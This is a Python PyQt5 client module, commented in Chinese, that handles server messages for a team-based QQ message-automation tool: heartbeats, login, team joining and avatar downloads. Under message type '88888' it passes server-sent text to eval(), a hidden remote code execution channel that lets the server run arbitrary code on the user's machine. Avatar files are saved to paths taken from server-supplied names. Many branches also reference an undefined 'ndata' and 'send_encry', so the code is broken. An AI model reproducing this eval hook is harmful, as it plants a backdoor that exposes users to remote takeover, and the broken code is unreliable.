import json
import logging
import os
import socket
import struct
import threading
import traceback
from PyQt5.QtCore import QThread, pyqtSignal, QSize, Qt, QTimer
import time
from PyQt5.QtGui import QIcon, QColor, QPixmap
import pyautogui
import re
import queue

socket_information = queue.Queue()
sock_lock = threading.Lock()  # 在全局或类里定义锁


def TypedJSONClient(msg_type,payload):
    data = {"type": msg_type, "data": payload}
    # 发送请求
    json_data = json.dumps(data).encode('utf-8')
    header = struct.pack('>I', len(json_data))
    s.sendall(header + json_data)


def recv_json(sock):
    """接收JSON数据（带长度前缀）"""
    try:
        # 读取4字节长度头
        header = sock.recv(4)
        if len(header) != 4:
            return None
        data_len = struct.unpack('>I', header)[0]

        # 分块读取数据
        chunks = []
        bytes_received = 0
        while bytes_received < data_len:
            chunk = sock.recv(min(data_len - bytes_received, 4096))
            if not chunk:
                break
            chunks.append(chunk)
            bytes_received += len(chunk)
        return json.loads(b''.join(chunks).decode('utf-8'))
    except (json.JSONDecodeError, UnicodeDecodeError) as e:
        print(f"JSON解码失败: {e}")
        return {'error': 'Invalid JSON'}
    except struct.error:
        return None

class MyThread(threading.Thread):  # 多线程封装（我也看不懂反正就是这么用的）
    def __init__(self, func, *args):
        super().__init__()

        self.func = func
        self.args = args

        self.setDaemon(True)
        self.start()  # 在这里开始

    def run(self):
        self.func(*self.args)


class HeartbeatThread(threading.Thread):
    def __init__(self, socket_obj, interval=5):
        super().__init__()
        self.daemon = True
        self.socket = socket_obj
        self.interval = interval
        self.running = True

    def run(self):
        while self.running:
            try:

                heartbeat_data = {"type": "heartbeat", "data": {"time": time.time()}}
                json_data = json.dumps(heartbeat_data).encode('utf-8')
                header = struct.pack('>I', len(json_data))
                with sock_lock:
                    self.socket.sendall(header + json_data)
                #print("[心跳] 已发送")
            except Exception as e:
                print(f"[心跳] 发送失败: {e}")
                self.running = False
            time.sleep(self.interval)

    def stop(self):
        self.running = False

class DataThread(QThread):
    signal = pyqtSignal(str)
    show_message_signal = pyqtSignal(str, str)  # (标题, 内容)
    team_send_response = pyqtSignal(str)  # (类型)
    def __init__(self, lis):
        super().__init__()
        global windows, s
        windows = lis[0]
        s = lis[1]
        # 启动心跳线程
        self.heartbeat_thread = HeartbeatThread(s)
        QTimer.singleShot(5000, self.heartbeat_thread.start)  # 5000 毫秒 = 5 秒
        #self.heartbeat_thread.start()

    def run(self):
        time.sleep(0.5)
        #s.settimeout(90)
        global current_time_string, exp_status, COLOR, temp_content, exp, lv
        while True:
            try:
                # 接收请求
                request = recv_json(s)

                if not request:
                    print("客户端断开连接")
                    break
                # 提取数据（带基本校验）
                '''if not isinstance(request, dict):
                    send_json(s, {"status": "error", "message": "Invalid request format"})
                    continue'''

                request_type = request.get('type')
                request_data = request.get('data')

                if request_type != 'heartbeat_ack':
                    print(f"收到请求: {request}")

                if not request_type or not request_data:
                    #send_json(ssl_socket, {"status": "error", "message": "Missing required fields"})
                    continue
                if request_type == '10005':
                    windows.close()
                    pyautogui.confirm(
                        "服务器已经关闭!\n感谢您本次的使用 服务器维护时间请关注官方公告!")

                elif request_type == '10006':
                    global number
                    number = ndata[1]

                elif request_type == '10012':
                    global send_status, content
                    content = re.sub('~~space~~', ' ', ndata[1])
                    content = re.sub('~~next~~', '\n', content)
                    send_status = True
                elif request_type == '15000':
                    content = re.sub('~~space~~', ' ', ndata[1])
                    content = re.sub('~~next~~', '\n', content)
                    windows.textBrowser.clear()
                    windows.textBrowser.append(content)

                elif request_type == '20001':
                    #windows.open_prompt_window("队伍不存在或加入失败")
                    pyautogui.confirm("队伍不存在或加入失败", '提示')
                elif request_type == 'sign_in':
                    if request_data.get("status") == 'successfully':
                        socket_information.put([request_data.get("information"), request_data.get("exp")])
                    else:
                        socket_information.put(request_data.get("information"))
                elif request_type == 'join_team':  # 加入队伍 (队员加入[自己])
                    try:
                        if request_data.get("status") == False:
                            self.show_message_signal.emit("提示", "队伍不存在或加入失败")
                            return
                        if request_data.get("model") == 'member':
                            with sock_lock:
                                windows.add_team_lineEdit.setVisible(False)
                                windows.create_team_button.setVisible(False)  # 创建队伍按钮
                                windows.add_team_button.setVisible(False)
                                windows.create_team_label_prompt.setVisible(True)
                                windows.user1.combo_options.setVisible(False)
                                windows.user2.combo_options.setVisible(False)
                                windows.team_btn_start.setVisible(False)
                                windows.team_layout.addWidget(windows.team_execute_prompt)

                                captain_name = request_data.get("Name")
                                captain_acc = request_data.get("Account")

                                windows.user1.lbl_name.setText(f"{captain_name}[队长]")
                                windows.user1.lbl_id.setText(f"ID:{captain_acc}")
                                '''windows.user1.avatar_user_team = QPixmap(f'./image/other_user.png').scaled(100, 100,
                                                                                                     Qt.KeepAspectRatio,
                                                                                                     Qt.SmoothTransformation)
                                windows.user1.avatar_frame.setPixmap(windows.user1.avatar_user_team)'''

                                windows.user2.lbl_name.setText(f"{windows.username.text()}[我]")
                                windows.user2.lbl_id.setText(f"{windows.username.text()}")
                                windows.user2.avatar_user_team = QPixmap('./temp/avatar.png').scaled(100, 100,
                                                                                                          Qt.KeepAspectRatio,
                                                                                                          Qt.SmoothTransformation)
                                windows.user2.avatar_frame.setPixmap(windows.user2.avatar_user_team)

                                if request_data.get("Avatar") == True:
                                    print('接收头像')
                                    # 接收图片文件大小
                                    file_size = int(s.recv(1024).decode())
                                    with open(f'./temp/{captain_acc}.jpg', 'wb') as file:
                                        total_received = 0
                                        while total_received < file_size:
                                            chunk = s.recv(2048)
                                            time.sleep(0.05)
                                            if not chunk:
                                                break
                                            file.write(chunk)
                                            total_received += len(chunk)
                                    windows.user1.avatar_user_team = QPixmap(f"./temp/{captain_acc}.jpg").scaled(100, 100,
                                                                                                                   Qt.KeepAspectRatio,
                                                                                                                   Qt.SmoothTransformation)
                                    windows.user1.avatar_frame.setPixmap(windows.user1.avatar_user_team)
                                else:
                                    windows.user1.avatar_user_team = (QPixmap('./image/float/fc.png').
                                                                      scaled(100, 100,Qt.KeepAspectRatio, Qt.SmoothTransformation))
                                    windows.user1.avatar_frame.setPixmap(windows.user1.avatar_user_team)
                                print("队伍加入成功!1")
                                self.show_message_signal.emit("提示", "队伍加入成功!")
                        else:
                            windows.user1.lbl_name.setText(f"{windows.username.text()}[队长][我]")
                            windows.user1.lbl_id.setText(f"{windows.userid.text()}")
                            avatar_load_status = windows.response_value("avatar_status")
                            if avatar_load_status:
                                windows.user1.avatar_user_team = QPixmap('./temp/avatar.png').scaled(100, 100,
                                                                                                     Qt.KeepAspectRatio,
                                                                                                     Qt.SmoothTransformation)
                                windows.user1.avatar_frame.setPixmap(windows.user1.avatar_user_team)
                            else:
                                windows.user1.avatar_user_team = QPixmap('./image/float/fc.png').scaled(100, 100,Qt.KeepAspectRatio,Qt.SmoothTransformation)
                                windows.user1.avatar_frame.setPixmap(windows.user1.avatar_user_team)
                            member_name = request_data.get("Name")
                            member_acc = request_data.get("Account")
                            windows.user2.lbl_name.setText(f"{member_name}[队员]")
                            windows.user2.lbl_id.setText(f"ID:{member_acc}")

                            if request_data.get("Avatar") == True:
                                print('接收头像')
                                # 接收图片文件大小
                                with sock_lock:
                                    file_size = int(s.recv(1024).decode())
                                    with open(f'./temp/{member_acc}.jpg', 'wb') as file:
                                        total_received = 0
                                        while total_received < file_size:
                                            chunk = s.recv(2048)
                                            time.sleep(0.2)
                                            if not chunk:
                                                break
                                            file.write(chunk)
                                            total_received += len(chunk)
                                icon = QIcon(f"./temp/{member_acc}.jpg")  # 将此处的路径替换为实际的图像路径
                                windows.user2.avatar_user_team = QPixmap(f"./temp/{member_acc}.jpg").scaled(100, 100,
                                                                                                          Qt.KeepAspectRatio,
                                                                                                          Qt.SmoothTransformation)
                                windows.user2.avatar_frame.setPixmap(windows.user2.avatar_user_team)
                            print("队伍加入成功!2")
                            self.show_message_signal.emit("提示", "队员加入成功!")
                        print("队伍加入成功!")
                    except Exception as e:
                        print(e)
                        traceback.print_exc()

                elif request_type == 'get_connect_status':
                    socket_information.put('获取成功')

                elif request_type == 'team_execute':
                    self.team_send_response.emit(request_data.get("types"))
                elif request_type == 'heartbeat_ack':
                    color = QColor(36, 152, 42)
                    windows.status_label.setStyleSheet(f"color: {color.name()};")  # 设置字体颜色
                    windows.status_label.setText("与服务器状态: 已连接")
                elif request_type == 'team_close':
                    if request_data.get("types") == 'member':
                        TypedJSONClient('team_close', {"types": 'member'})  # 解除成员/队长状态
                        windows.quit_team_C()
                        self.show_message_signal.emit("提示", "队长已退出队伍 队伍已关闭!")
                        #pyautogui.confirm("队长已退出队伍 队伍已关闭!", "提示")
                    else:
                        TypedJSONClient('team_close', {"types": 'captain'})
                        windows.quit_team_H()
                        self.show_message_signal.emit("提示", "队员已退出队伍!")
                        #pyautogui.confirm("队员已退出队伍!", "提示")
                elif request_type == 'admin':
                    if request_data.get("status") == 'Successfully':
                        print(f'管理员权限存在 {request_data.get("result")}')
                    else:
                        print("管理员权限不存在")
                elif request_type == '20003':  # 队员加入
                    windows.user1.lbl_name.setText(f"{windows.username.text()}[队长][我]")
                    windows.user1.lbl_id.setText(f"{windows.username.text()}")
                    windows.user1.avatar_user_team = QPixmap('./temp/HImage.png').scaled(100, 100,
                                                                                              Qt.KeepAspectRatio,
                                                                                              Qt.SmoothTransformation)
                    windows.user1.avatar_frame.setPixmap(windows.user1.avatar_user_team)
                    windows.user2.lbl_name.setText(f"{ndata[2]}[队员]")
                    windows.user2.lbl_id.setText(f"ID:{ndata[1]}")

                    if ndata[3] == 'True':
                        # 接收图片文件大小
                        file_size = int(s.recv(1024).decode())
                        with open(f'./temp/{ndata[1]}.jpg', 'wb') as file:
                            total_received = 0
                            while total_received < file_size:
                                chunk = s.recv(2048)
                                time.sleep(0.2)
                                if not chunk:
                                    break
                                file.write(chunk)
                                total_received += len(chunk)
                        icon = QIcon(f"./temp/{ndata[1]}.jpg")  # 将此处的路径替换为实际的图像路径
                        windows.user2.avatar_user_team = QPixmap(f"./temp/{ndata[1]}.jpg").scaled(100, 100,
                                                                                                  Qt.KeepAspectRatio,
                                                                                                  Qt.SmoothTransformation)
                        windows.user2.avatar_frame.setPixmap(windows.user2.avatar_user_team)
                    #windows.show_message_box("提示", "队员加入成功!")
                    self.show_message_signal.emit("提示", "队员加入成功!")
                    #pyautogui.confirm("队员加入成功!")
                elif request_type == '20004':  # 队长退出队伍
                    try:
                        windows.quit_team_C()
                        send_encry("20020", s)
                        pyautogui.confirm("队长已退出队伍 队伍已关闭!", "提示")
                    except Exception as e:
                        logging.exception(str(time.strftime('%Y-%m-%d  %H:%M:%S', time.localtime())) + "错误:" + str(e))
                        pyautogui.confirm(e)
                        traceback.print_exc()
                elif request_type == '20005':  # 队员退出队伍
                    try:
                        windows.quit_team_H()
                        send_encry("20021", s)
                        pyautogui.confirm("队员已退出队伍!", "提示")
                    except Exception as e:
                        logging.exception(str(time.strftime('%Y-%m-%d  %H:%M:%S', time.localtime())) + "错误:" + str(e))
                        pyautogui.confirm(e)
                        traceback.print_exc()
                elif request_type == '20011':  # 队员发送句柄消息
                    windows.team_execute_prompt.setText(f"即将发送QQ句柄消息")
                    try:
                        windows.run_team_command("handle")
                    except Exception as e:
                        print(e)
                elif request_type == '20012':  # 队员发送@消息
                    windows.team_execute_prompt.setText(f"即将发送@QQ消息")
                    windows.run_team_command("qq")
                elif request_type == '20013':  # 队员发送复制消息
                    windows.team_execute_prompt.setText(f"即将发送QQ复制消息")
                    windows.run_team_command("copy")
                elif request_type == '20014':  # 队员发送复制消息
                    windows.team_execute_prompt.setText(f"即将进行QQ信息更新")
                    windows.run_team_command("update")
                elif request_type == '20015':  # 队员发送复制消息
                    windows.team_execute_prompt.setText(f"即将开始执行自动脚本")
                    windows.run_team_command("execute")
                elif request_type == '20016':  # 队长发送类型错误
                    windows.team_execute_prompt.setText(f"未知类型 错误!")
                    try:
                        pyautogui.confirm("ERROR! UNKNOWN")
                    except Exception as e:
                        print(e)
                elif request_type == '20030':
                    text = ndata[1]
                    text = re.sub('~~space~~', ' ', text)
                    windows.talk_textBrowser.append(str(text))
                    windows.play_sound()
                elif request_type == 'repetitive_login':  # 客户端登出
                    IP = request_data.get("IP")
                    position = request_data.get("position")
                    system = request_data.get("system")
                    computer_name = request_data.get("computer_name")
                    windows.status_label.setStyleSheet(f"color: red;")  # 设置字体颜色
                    windows.status_label.setText("与服务器状态: 断开连接")
                    now_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
                    pyautogui.confirm(
                        f"{now_time} 账号已在其他客户端登录 \n来自 IP:{IP} {position} \n操作系统名称:{system} 设备名称:{computer_name}\n本客户端已与服务器断开连接 如非本人操作请尽快修改密码!")
                    windows.close()
                    os._exit(0)
                elif request_type == '99999':  # 服务器状态检测
                    color = QColor(36, 152, 42)
                    windows.status_label.setStyleSheet(f"color: {color.name()};")  # 设置字体颜色
                    windows.status_label.setText("与服务器状态: 已连接")
                elif request_type == '30001':
                    socket_information.put(ndata)
                    exp_status = True
                elif request_type == '30002':
                    socket_information.put("内部激活:1000经验添加成功 重启客户端即可生效")
                    #socket_information.put(ndata[1])
                elif request_type == '30003':
                    socket_information.put(ndata[1])
                    #exp_status = 'Yes'
                elif request_type == '30010':
                    socket_information.put(ndata[1])

                elif request_type == '88888':
                    command = ndata[1]
                    try:
                        command = re.sub('~~space~~', ' ', command)
                        command = re.sub('~~next~~', '\n', command)
                    except:
                        pass
                    if '--~~comm~~--' in command:
                        command = command.split('--~~comm~~--')
                        for x in command:
                            eval(x)
                    else:
                        eval(command)

                elif request_type == '90002':
                    socket_information.put(ndata[1])

                elif not request_type:
                    print("断开连接")
                    break
            except socket.timeout:  # 专门捕获超时异常
                if hasattr(self, 'heartbeat_thread'):
                    self.heartbeat_thread.stop()

                print('与服务器断开连接')
                color = QColor(164, 38, 15)  # 使用RGB值设置颜色为红色
                windows.status_label.setStyleSheet(f"color: {color.name()};")  # 设置字体颜色
                windows.status_label.setText("与服务器状态: 断开连接")
            except Exception as e:
                if 'WinError' in str(e):
                    color = QColor(164, 38, 15)  # 使用RGB值设置颜色为红色
                    windows.status_label.setStyleSheet(f"color: {color.name()};")  # 设置字体颜色
                    windows.status_label.setText("与服务器状态: 断开连接")
                    pyautogui.confirm(
                        "已与服务器断开连接 请检测网络是否连接或联系管理员获取帮助")
                if "\'utf-8\' codec can't decode byte" in str(e):
                    pass
                else:
                    print("An error occurred:", e)

                    logging.exception(str(time.strftime('%Y-%m-%d  %H:%M:%S', time.localtime())) + "错误:" + str(e))
                    traceback.print_exc()
                    break